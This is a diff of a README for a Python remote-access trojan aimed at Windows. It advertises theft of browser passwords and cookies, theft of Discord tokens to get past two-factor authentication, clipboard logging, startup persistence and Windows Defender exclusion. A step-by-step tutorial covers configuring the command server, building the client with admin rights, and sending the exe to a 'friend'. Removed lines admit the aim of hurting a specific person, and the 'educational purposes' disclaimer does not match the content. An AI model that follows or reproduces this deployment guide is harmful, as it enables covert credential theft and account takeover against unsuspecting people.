@@ -1,10 +1,9 @@
-# Ihaveenemies rat
+# DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY.
 
-description
-
+# Simple rat
 ## Table of Contents
 - [Features](#features)
-- [What is this](#what-is-this)
+- [What is this](#)
 - [Tutorial](#tutorial)
 - [License](#license)
 
@@ -22,74 +21,74 @@ description
   - Ip-address
   - Mac-address
   - Boot time
+  - Antivirus name
   - Memory information
   - Disk information (Total Size, used, free, percentage) 
-- Files
+- Files (not working)
   - Camera files (some cringe files)
   - Voice Recorder (another cringe files)
-- General functions
-  - You will get new passwords every time PC restarts (because it will rerun the program).
-  - Copy the script to a random folder on PC and place it in startup.
-  - Add this folder to exclusion to antivirus (only windows defender)
-
-## What is this
-this virus 
+- Stealer (Chrome, edge, opera Gx)
+  - password stealer
+  - cookie stealer
+- Other
+  - Add virus to startup startup.
+  - Add virus folder to exclusion to antivirus (only windows defender)
 
 ## Tutorial:
 
-1. Set up a Python server. (you can use repl.it)
-2. Upload the server.py file and the templates folder to the server.
-3. Change the port in the last line of server.py to match your server's port.
-4. In line 7 of client.pyw, replace '127.0.0.1:5000' with your server's IP address and port.
-5. Start your server.
-6. Build client.pyw, add file 'NoCamera.avi', add all modules and select the checkbox "--uac-admin".
-7. Share the generated client.exe file with your friend.
-
-## License
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
+1. Set up a Python server. (like repl.it or similar)
+2. Upload the server.py and templates folder to the server
+3. Change the port in the last line of server.py to match your server's port
+4. In line 30 of client.pyw, replace '127.0.0.1:5000' with your server's IP address and port
+5. Start your server
+6. Build client.pyw, add file 'NoCamera.avi', all modules and then add "--uac-admin"
+7. Share the generated client.exe file with your "friend"
 
 ## Change log for version 4v:
-- Added a console on the client page (in case there's any error on the client side). It wasn't present in version 3, but I wrote that it was.
-- Added PC information (knows everything from IP to all disks).
-- Discord token stealer (with them, you can bypass two-factor authentication and access an account).
-- Split the entire script (200 lines) into smaller files to make it clear what's happening in the code.
-- ClipboardLogger.
+- Added PC information
+- Discord token stealer (with them, you can bypass two-factor authentication and access an account)
+- Split the entire script into smaller files
+- ClipboardLogger
 - Now it adds current folder as exclusion to antivirus
 
 ## Todo:
 - You can add an auto-update system, but alternatively, you could make the client simply fetch the code from the server. Well, we need to think about it.
-- Key logger (don't see much point, to be honest).
-- Make it a real virus, not just a toy to play with. This condition will be met when my "friend" spends a whole day with this virus and doesn't notice anything (well, he's not really a friend anymore, and he's a hypocrite, which is why I'm making this virus to teach him a lesson).
+- Keylogger (don't see much point, to be honest).
 
-
+## Requirements:
 ### Requirements for server:
 ```
 Flask
+Flask-SocketIO
 opencv-python
 numpy
 ```
 
 ### Requirements for client:
 ```
-cv2
-numpy
-pyautogui
-requests
-pyperclip
-pycrypto
-discord.py
-pywin32
-cpuinfo
+opencv-python
 psutil
-tkinter
+requests
+python-socketio
+Pillow
+pyautogui
+tendo
+py-cpuinfo
+pywin32
+pyperclip
+pycryptodome
+discord.py
+pypiwin32
 ```
 
 ### How to delete this:
-- Go to the antivirus and delete the exclusion folder.
+1. Check task manager and close virus
+2. Go to the antivirus and delete the exclusion folder.
+3. Delete virus folder (you can find it when closing virus in task manager)
 
 ### Known issues:
 1. Working only on Windows
 2. Works only if the antivirus is Windows Defender.
-
-
-# DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY.
+3. 
+## License
+[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
